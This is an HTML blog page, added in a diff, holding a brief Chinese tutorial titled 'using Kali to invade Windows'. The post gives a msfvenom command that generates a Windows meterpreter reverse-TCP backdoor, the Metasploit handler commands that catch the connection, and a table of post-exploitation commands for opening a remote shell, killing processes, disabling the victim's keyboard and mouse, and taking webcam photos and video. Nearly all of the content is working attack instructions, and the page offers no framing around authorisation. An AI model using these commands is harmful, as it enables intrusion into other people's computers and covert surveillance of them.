@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Gao Zhiqiang">
+
+
+
+
+
+<title>使用KaLi入侵windows | My Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">HOME PAGE</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">HOME PAGE</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">使用KaLi入侵windows</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Gao Zhiqiang</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 5, 2020&nbsp;&nbsp;22:20:55</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="使用KaLi入侵windows"><a href="#使用KaLi入侵windows" class="headerlink" title="使用KaLi入侵windows"></a>使用KaLi入侵windows</h1><h3 id="msf渗透："><a href="#msf渗透：" class="headerlink" title="msf渗透："></a>msf渗透：</h3><ul>
+<li>虚拟机</li>
+<li>准备入侵的windows电脑</li>
+</ul>
+<h6 id="一、生成后门程序"><a href="#一、生成后门程序" class="headerlink" title="一、生成后门程序"></a>一、生成后门程序</h6><p>打开终端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;[本机Ip] lport&#x3D;[端口] -f exe &gt; 路径&amp;文件名</span><br></pre></td></tr></table></figure>
+
+<h6 id="二、部署msf"><a href="#二、部署msf" class="headerlink" title="二、部署msf"></a>二、部署msf</h6><ul>
+<li>进入msfconsole</li>
+<li>use exploit/multi/handler</li>
+<li>set payload windows/meterpreter/reverse_tcp</li>
+<li>set lhost [本机IP]</li>
+<li>set lport [本机端口]</li>
+<li>exploit</li>
+</ul>
+<h6 id="三、相关信息"><a href="#三、相关信息" class="headerlink" title="三、相关信息"></a>三、相关信息</h6><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>sessions -i &lt;id值&gt;</td>
+<td>#进入会话 -k 杀死会话</td>
+</tr>
+<tr>
+<td>background</td>
+<td>#将当前会话放置后台</td>
+</tr>
+<tr>
+<td>getuid</td>
+<td>#查看已有的权限</td>
+</tr>
+<tr>
+<td>getpid</td>
+<td>#获取当前进程的pid</td>
+</tr>
+<tr>
+<td>sysinfo</td>
+<td>#查看目标系统信息</td>
+</tr>
+<tr>
+<td>ps</td>
+<td>#查看当前活跃进程</td>
+</tr>
+<tr>
+<td>kill <pid></td>
+<td>#杀死进程值</td>
+</tr>
+<tr>
+<td>reboot/shutdown</td>
+<td>#重启/关机</td>
+</tr>
+<tr>
+<td>shell</td>
+<td>#进入目标主机cmd shell</td>
+</tr>
+<tr>
+<td>uictl [enable/disable] [keyboard/mouse/all]</td>
+<td>#开启或禁用键盘/鼠标</td>
+</tr>
+<tr>
+<td>uictl disable mouse</td>
+<td>#禁用鼠标</td>
+</tr>
+<tr>
+<td>uictl disable keyboard</td>
+<td>#禁用键盘</td>
+</tr>
+<tr>
+<td>webcam_list</td>
+<td>#查看远程摄像头</td>
+</tr>
+<tr>
+<td>webcam_snap</td>
+<td>#通过摄像头拍照</td>
+</tr>
+<tr>
+<td>webcam_stream</td>
+<td>#通过摄像头开启视频</td>
+</tr>
+</tbody></table>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/10/07/BFD%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/">BFD（（Bidirection ForwardingDetection）协议原理与配置</a>
+            
+            
+            <a class="next" rel="next" href="/2020/10/05/kaLi%20Linux%20%E5%AE%89%E8%A3%85%E5%AE%8C%E5%90%8E%E7%9A%84%E7%AE%80%E5%8D%95%E9%85%8D%E7%BD%AE/">kaLi Linux 安装完后的简单配置</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Gao Zhiqiang | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
